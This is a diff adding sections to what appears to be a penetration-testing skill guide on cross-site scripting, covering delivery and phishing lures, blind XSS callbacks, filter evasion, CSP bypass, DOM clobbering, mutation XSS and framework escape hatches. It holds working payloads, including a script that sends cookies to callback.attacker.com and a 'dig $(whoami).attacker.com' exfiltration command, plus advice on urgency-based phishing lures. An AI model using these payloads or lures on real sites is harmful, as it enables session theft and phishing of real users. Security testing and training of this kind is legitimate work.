@@ -149,6 +149,202 @@ Construct post-exploitation payloads for cookie theft, keylogging, and page cont
 
 ---
 
+## XSS Payload Delivery and Social Engineering
+
+Even the most sophisticated XSS payload is useless without a delivery mechanism that reaches the victim's browser. This section covers the delivery vectors and social engineering techniques that make XSS attacks successful in real-world engagements.
+
+**Delivery Vectors**:
+
+| Vector | XSS Type | Typical Scenario |
+|--------|----------|-----------------|
+| Crafted URL (email/chat) | Reflected | Phishing email with link containing payload in query parameter |
+| Malicious comment/post | Stored | Forum, blog, or social media post with embedded payload |
+| Compromised third-party script | Supply Chain | Ad networks, analytics scripts, CDN-hosted libraries |
+| Shortened URLs | Reflected | URL shorteners hide the payload from visual inspection |
+| QR code | Reflected | Physical-world delivery: posters, business cards, printed materials |
+| WiFi captive portal | Stored/DOM | Rogue access point injecting scripts into login page |
+| Malicious browser extension | DOM | Extension content scripts interacting with target page |
+
+**Social Engineering Amplifiers**: Reflected XSS requires victim interaction. The click-through rate depends on context credibility. The most effective lures combine urgency ("Your account will be suspended"), authority ("Internal IT portal update"), and familiarity (matching corporate branding). Shortened URLs and QR codes reduce visual suspicion.
+
+**Key Principle**: During penetration testing, always demonstrate the full attack chain including the delivery mechanism, not just the payload. Stakeholders understand risk better when they see how an attacker would actually reach their users.
+
+---
+
+## Blind XSS and Callback Techniques
+
+Blind XSS occurs when the injected payload executes in a context the attacker cannot directly observe -- typically in an admin panel, internal dashboard, log viewer, or support ticket system. The attacker injects a payload with an external callback mechanism and waits for the payload to fire when an authorized user views the affected page.
+
+**Callback Mechanisms**:
+
+| Mechanism | Command | Use Case |
+|-----------|---------|----------|
+| XSS Hunter | `xsshunter.com` integration | Automated blind XSS detection with screenshots |
+| Interactsh | `interactsh-client` | Self-hosted OOB callback server |
+| Burp Collaborator | Built into Burp Suite | Integrated with Burp testing workflow |
+| Custom webhook | `https://webhook.site` | Quick ad-hoc callback testing |
+| DNS exfiltration | `dig $(whoami).attacker.com` | When HTTP callbacks are blocked |
+
+**High-Value Blind XSS Injection Points**:
+- User-Agent, Referer, X-Forwarded-For headers (echoed in admin analytics)
+- Support ticket fields (viewed by staff in internal systems)
+- User profile fields (viewed by admins during moderation)
+- File metadata (EXIF data, filenames in upload forms)
+- API logs and error tracking systems (Sentry, Datadog)
+
+**Payload Pattern**: `<script>fetch('https://callback.attacker.com/xss?c='+document.cookie+'&l='+location.href)</script>`
+
+> **For detailed escalation techniques see `guides/xss-to-rce-escalation-guide.md`.**
+
+---
+
+## XSS Filter Evasion
+
+XSS filter evasion is the art of crafting payloads that bypass sanitization libraries, browser built-in XSS auditors, and custom input filters. Modern web applications deploy multiple layers of defense, but each layer introduces parser inconsistencies that attackers can exploit.
+
+**Core Evasion Strategies**:
+
+| Strategy | Technique | Example |
+|----------|-----------|---------|
+| Encoding obfuscation | HTML Entity, URL, Unicode, Base64 | `&#x61;lert(1)` |
+| Case manipulation | Mixed-case tag/attribute names | `<ScRiPt>alert(1)</ScRiPt>` |
+| Null byte injection | Break parser logic with `%00` | `<scr%00ipt>alert(1)</script>` |
+| Whitespace tricks | Tab, newline, carriage return | `<img src=x onerror="al\tfert(1)">` |
+| Tag alternatives | Lesser-known event handlers | `<details open ontoggle=alert(1)>` |
+| SVG/MathML nesting | Abuse namespace parsing | `<svg><animate onbegin=alert(1)>` |
+
+**Key Principle**: Every filter operates on a specific parser. When the filter's parser and the browser's parser disagree on how to interpret the same string, evasion is possible. The goal is to construct a string that the filter considers safe but the browser executes as code.
+
+> **For detailed evasion payloads see `guides/xss-filter-evasion-guide.md` and `payloads.md`.**
+
+---
+
+## Content Security Policy Bypass
+
+Content Security Policy (CSP) is a browser-enforced defense that restricts which scripts a page can execute. However, misconfigured CSP policies are common and can be systematically bypassed.
+
+**Common CSP Weaknesses**:
+
+| Misconfiguration | Bypass Technique |
+|------------------|-----------------|
+| `unsafe-inline` in `script-src` | Direct inline script injection |
+| `unsafe-eval` in `script-src` | `eval()`, `Function()`, `setTimeout(string)` |
+| Whitelisted CDN domains | Load malicious JS from allowed CDN or use JSONP endpoints |
+| Missing `base-uri` restriction | `<base>` tag hijacking to redirect script loads |
+| Missing `object-src` restriction | `<object>` / `<embed>` tag injection |
+| Permissive `script-src` with Angular | Angular template injection via `ng-app` + `{{$eval.constructor('alert(1)')()}}` |
+| `strict-dynamic` with pre-existing script | Leverage script gadgets in trusted JS to load attacker code |
+
+**CSP Bypass Workflow**:
+1. Extract CSP header: `curl -sI https://target.com | grep -i content-security-policy`
+2. Analyze with Google CSP Evaluator or `csp-evaluator` tool
+3. Identify allowed script sources and JSONP endpoints
+4. Construct payload using the weakest allowed directive
+
+> **For comprehensive CSP bypass techniques see `guides/csp-bypass-techniques-guide.md`.**
+
+---
+
+## DOM Clobbering
+
+DOM Clobbering is an advanced technique that exploits the browser's named property lookup on the `window` and `document` objects. By injecting HTML elements with specific `id` or `name` attributes, attackers can overwrite or shadow JavaScript variables and DOM references.
+
+**How It Works**: When a browser encounters `<form id="config">` or `<img name="isAdmin">`, these elements become accessible as `window.config` and `window.isAdmin`. If the application's JavaScript references global variables with the same names, the injected HTML elements take precedence.
+
+**Common Attack Patterns**:
+
+```html
+<!-- Overwrite a global configuration object -->
+<form id="config"><input name="apiEndpoint" value="https://evil.com/api"></form>
+<!-- Now window.config.apiEndpoint === "https://evil.com/api" -->
+
+<!-- Shadow a boolean check -->
+<img name="isAdmin" src=x>
+<!-- Now window.isAdmin is an HTMLImageElement (truthy) -->
+
+<!-- Clobber document methods via named forms -->
+<form name="cookie"><input name="toString" value="session=stolen"></form>
+```
+
+**Impact**: DOM Clobbering can bypass sanitization logic, redirect API calls to attacker-controlled endpoints, disable security checks, and escalate to full XSS when combined with other vulnerabilities like prototype pollution.
+
+---
+
+## Mutation XSS (mXSS)
+
+Mutation XSS exploits differences between how sanitization libraries parse HTML and how the browser actually parses it during DOM insertion. When sanitized HTML is inserted into the DOM via `innerHTML` and then read back via `innerHTML` getter, the browser may "mutate" the HTML into a form that the sanitizer did not anticipate.
+
+**Root Cause**: HTML parsing is not a reversible operation. The serialization step (reading `innerHTML`) can produce different output than the original input because the browser's parser applies error correction, namespace changes, and element reorganization rules.
+
+**Classic mXSS Vectors**:
+
+```html
+<!-- SVG namespace confusion (DOMPurify < 2.0.16) -->
+<svg></p><style><a id="</style><img src=1 onerror=alert(1)>">
+
+<!-- MathML namespace with SVG nesting -->
+<math><mtext><table><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(1) src=1>">
+
+<!-- Backtick inside SVG style -->
+<svg><style>*{background:url(``</style><img onerror=alert(1) src=x>)</svg>
+```
+
+**Defense**: Use DOMPurify with `FORCE_BODY` option, keep the library updated (mXSS bypasses are discovered regularly), and avoid `innerHTML` entirely when `textContent` suffices.
+
+> **For mXSS research references see the Learning Resources section and `guides/xss-filter-evasion-guide.md`.**
+
+---
+
+## XSS in Modern Frameworks
+
+Modern JavaScript frameworks (React, Vue, Angular) provide built-in XSS protections through automatic escaping and context-aware encoding. However, developers can bypass these protections using framework-specific escape hatches, and each framework has unique XSS attack surfaces.
+
+**Framework-Specific XSS Vectors**:
+
+| Framework | Safe by Default | Escape Hatch | XSS Vector |
+|-----------|----------------|--------------|------------|
+| React | Yes (JSX auto-escapes) | `dangerouslySetInnerHTML` | `__html: userInput` |
+| Vue | Yes (`{{ }}` / `v-text`) | `v-html` | `<div v-html="userInput">` |
+| Angular | Yes (auto-sanitization) | `bypassSecurityTrust*` methods | `DomSanitizer.bypassSecurityTrustHtml(userInput)` |
+| Svelte | Yes (`{}` auto-escapes) | `{@html}` | `{@html userInput}` |
+| Next.js | Yes (React-based) | `dangerouslySetInnerHTML` + SSR | SSR template injection |
+
+**Template Injection**: Beyond direct HTML injection, many frameworks support template expressions that can be exploited when user input flows into template compilation:
+
+```javascript
+// Angular template injection (when ng-app is present)
+{{$eval.constructor('alert(1)')()}}
+
+// Vue template injection (when dynamic template compilation is used)
+{{constructor.constructor('alert(1)')()}}
+
+// React JSX injection via dangerouslySetInnerHTML
+<div dangerouslySetInnerHTML={{__html: '<img src=x onerror=alert(1)>'}} />
+```
+
+**Key Takeaway**: Never assume a framework's built-in protection is sufficient. Always audit code for escape hatches (`v-html`, `dangerouslySetInnerHTML`, `{@html}`), server-side template injection, and stored XSS through API endpoints that bypass client-side sanitization.
+
+## XSS Impact Classification
+
+| Impact Level | Capability | Example Attack |
+|-------------|-----------|----------------|
+| Low | Page defacement, alert boxes | `<script>alert(1)</script>` |
+| Medium | Session hijacking, credential theft | Cookie stealing via document.cookie |
+| High | Keylogging, phishing, crypto mining | Keyboard event capture scripts |
+| Critical | RCE (via Electron/Node), worm propagation | Samy worm, XSS-to-RCE chains |
+
+## XSS Defense Quick Reference
+
+| Defense | Mechanism | Bypass Potential |
+|---------|-----------|-----------------|
+| Content Security Policy | Restricts script sources | JSONP, script gadgets, strict-dynamic |
+| HTTPOnly Cookies | Prevents JS access to cookies | Session fixation, token theft via other means |
+| Input Validation | Rejects malicious input | Encoding bypass, double encoding |
+| Output Encoding | Escapes special characters | Context mismatch, DOM-based XSS |
+| WAF | Pattern-based blocking | Obfuscation, encoding, fragmentation |
+
+---
+
 ## Learning Resources
 
   **Supplementary files for this skill**: payloads.md, test-cases.md
